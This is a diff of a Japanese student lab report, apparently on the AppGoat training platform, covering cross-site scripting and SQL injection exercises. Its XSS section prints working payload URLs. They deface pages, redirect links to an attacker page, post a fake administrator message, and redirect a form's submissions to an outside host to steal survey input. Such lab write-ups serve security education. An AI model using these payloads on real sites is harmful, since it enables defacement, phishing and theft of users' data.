@@ -35,24 +35,228 @@ Webアプリケーション脆弱性演習レポート\\}
 \section{クロスサイト・スクリプティング}
 
 \subsection{クロスサイト・スクリプティングとは}
+クロスサイト・スクリプティングの脆弱性とは、悪意のある人が不正なスクリプト
+を何らかの手段でウェブページに埋め込むことで、その不正なスクリプトが被害者
+のブラウザ上で実行されてしまう脆弱性である。この脆弱性が悪用されてしまうと、
+偽のウェブページが表示されたり、情報が漏洩したりする可能性がある。
 
 \subsection{Level1演習}
+この演習では、ある登録画面の入力に対して
+\begin{math}「'>"><hr>」\end{math}と入力した結果。本来入力された
+文字列を確認する画面にて、水平な線が引かれた。その様子を以下の図1,2に示す。
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.32]{pic1.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic2.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
+
+これは、内部の処理において、入力された文字列のエスケープ処理が施されていなかった
+ために、出力画面において入力されたスクリプトがそのまま実行されてしまったと
+考えられる。\\
 
 \subsection{Level2演習}
 
+\subsubsection*{アンケートページの改竄(反射型)}
+この演習では、名前を入力する欄に脆弱性を確認できた。また、入力された内容が
+urlにも反映されることを利用して、アンケートページの内容を書き換え、通常とは
+異なるアンケートページを表示するurlを作成し、それを掲示板に貼る攻撃を行った。
+実際に作成したurlは「
+\url{http://appgoat.cysec-lab.org/Users/is0585xf/Web/Scenario1121/VulSoft/enquete.php?page=2&name=<script>document.getElementById("account").innerHTML='なんでも入力してね'</script>&sex=0&old=20&company=&xss=1&trouble=1&content=}
+」である。これは、url内の「name=」の部分がそのまま名前入力欄と対応しているので、
+その部分に直接スクリプトを書き込んでいる。\\
+通常のアンケート画面と改編後のアンケート画面を以下の図3,4に示す。
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.32]{pic3.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic4.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
+
+これは、Level1演習の時と同じように、入力された文字列に対してエスケープ処理
+が施されていなかったため、入力されたスクリプトがそのまま実行されたと考えられる。
+
+
+\subsubsection*{入力情報の漏洩(反射型)}
+この演習では、名前を入力する欄に脆弱性を確認できた。また、入力された内容が
+urlにも反映されることを利用して、アンケートの送信先を変更するスクリプトを
+urlに埋め込み、そのurlからアクセスした人のアンケート結果を盗む攻撃を行った。
+実際に作成したurlは「\url{http://appgoat.cysec-lab.org/Users/is0585xf/Web/Scenario1122/VulSoft/enquete.php?page=2&name=<script>document.getElementById("enquete_form").action='https://zyouhourouei.com'</script>&sex=0&old=&company=&xss=1&trouble=1&content=}
+」である。これは、url内の「name=」の部分がそのまま名前入力欄と対応しているので、
+その部分に直接スクリプトを書き込んでいる。\\以下の図に元のサイトからのアンケート送信結果と、掲示板のurlから
+アクセスしたサイトのアンケート送信結果を以下の図5,6に示す。
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic5.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic6.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
+
+これは、Level1演習の時と同じように、入力された文字列に対してエスケープ処理
+が施されていなかったため、入力されたスクリプトがそのまま実行されたと考えられる。
+
+\subsubsection*{掲示板に埋め込まれるスクリプト(格納型)}
+この演習では、掲示板の本文を入力する欄に脆弱性が確認できた。また、掲示板であるので
+投稿された内容(スクリプト)はその投稿が削除されるまで継続されることを利用して、
+アクセスしたユーザの画面にポップアップダイアログを表示するスクリプトを埋め込む。
+実際に埋め込んだスクリプトとその結果を以下の図7,8に示す。 \\
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic7.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic8.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
+
+これは、Level1演習の時と同じように、入力された文字列に対してエスケープ処理
+が施されていなかったため、入力されたスクリプトがそのまま実行されたと考えられる。
+
+\subsubsection*{webページの改竄(DOMベース)}
+この演習では、検索エンジンの検索ワード欄に脆弱性を確認できた。また、urlに
+検索ワードが組み込まれることを利用して、検索結果で表示されるページのリンク
+先を変更するurlを作成し、そのurlからアクセスした人を危険なサイトへと誘導する
+攻撃を行った。実際に作成したurlは「\url{http://appgoat.cysec-lab.org/Users/is0585xf/Web/Scenario1124/VulSoft/search.php?page=1&submit=1&keyword=<script>document.getElementById('link0').href='http://appgoat.cysec-lab.org/Users/is0585xf/Web/Scenario1124/attackers_page.php';</script>
+}」である。これは、url内の「keyword=」の部分が検索ワードと対応しており、そこに
+直接リンク先を変更するスクリプトを埋め込んでいる。以下の図9,10が示すように、
+作成したリンクから飛んだwebベージで表示されているページにアクセスすると、表示
+内容とは異なる攻撃者のページに遷移していることがわかる。
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic9.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic10.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
+
+これは、Level1演習の時と同じように、入力された文字列に対してエスケープ処理
+が施されていなかったため、入力されたスクリプトがそのまま実行されたと考えられる。
+
 \subsection{Level3演習}
+
+\subsubsection*{不完全な対策}
+この演習では、掲示板の本文入力欄に脆弱性が確認できた。しかし、本文に直接
+スクリプトを入れることは入力チェックで弾かれるため、まずは普通に投稿を
+行い、その後生成されるurlに対してスクリプトを埋め込み、サイトを更新
+すると入力チェックを回避して投稿が可能であった。実際に作成したurlは「\url{http://appgoat.cysec-lab.org/Users/is0585xf/Web/Scenario1131/VulSoft/bbs.php?name=1&title=1&url=&content=<script>document.getElementById("warning").innerHTML="管理者の発言：このページでは誹謗中傷を歓迎します。";</script>}」
+である。これは、url内の「content=」の部分が本文入力欄と対応しており、そこに
+直接スクリプトを埋め込んでいる。実際に入力チェックを回避してスクリプトを
+埋め込んだ画面を以下の図11に示す。
+
+\begin{figure}[h]
+  \centering
+  \includegraphics[scale=0.4]{pic11.png}
+  \caption{}
+\end{figure}
+
+これは、Level1演習の時と同じように、入力された文字列に対してエスケープ処理
+が施されていなかったため、入力されたスクリプトがそのまま実行されたと考えられる。
+
+\subsubsection*{ヘッダ要素へのスクリプト}
+
+Mac環境のためできませんでした。
+
+\subsection{問1}
+
+\subsubsection*{(a)Cookieが漏洩しない仕組みはどのようなものか}
+
+\subsubsection*{(b)クロスサイトスクリプティングではなぜCookieが漏洩してしまうのか。}
+
+\subsubsection*{(c)Cookieの漏洩によって起きうる被害はなにか。}
+
+\subsubsection*{(d)クロスサイト・スクリプティングでCookieが漏洩しないようにするためには}
 
 
 
 \section{SQLインジェクション}
 
 \subsection{SQLインジェクションとは}
+SQLインジェクションとは、悪意のあるリクエストにより、ウェブアプリケーション
+が意図しないSQL文を実行してしまうことで、データベースを不正に操作されてしま
+う脆弱性である。この脆弱性が悪用されてしまうとデータベース内の情報が改ざんさ
+れたり、個人情報や機密情報が漏えいしたりする可能性がある。
 
 \subsection{Level1演習}
+この演習では、とあるログイン画面のパスワードに「'」を入力するとデータベース
+エラーが発生することから、SQLインジェクションを引き起こす可能性がある。
+
+\begin{figure}[h]
+  \centering
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic12.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+  \begin{minipage}[b]{0.45\linewidth}
+  \begin{center}
+    \includegraphics[keepaspectratio,scale=0.3]{pic13.png}
+    \end{center}
+    \caption{}
+  \end{minipage}
+\end{figure}
 
 \subsection{Level2演習}
 
+\subsubsection*{不正なログイン(文字列リテラル)}
+
+\subsubsection*{情報漏洩(数値リテラル」)}
+
+\subsubsection*{他テーブル情報の漏洩(数値リテラル)}
+
+\subsubsection*{データベースの改ざん(数値リテラル)}
+
+
 \subsection{Level3演習}
+
+\subsubsection*{ブラインドSQLインジェクション}
 
 
 
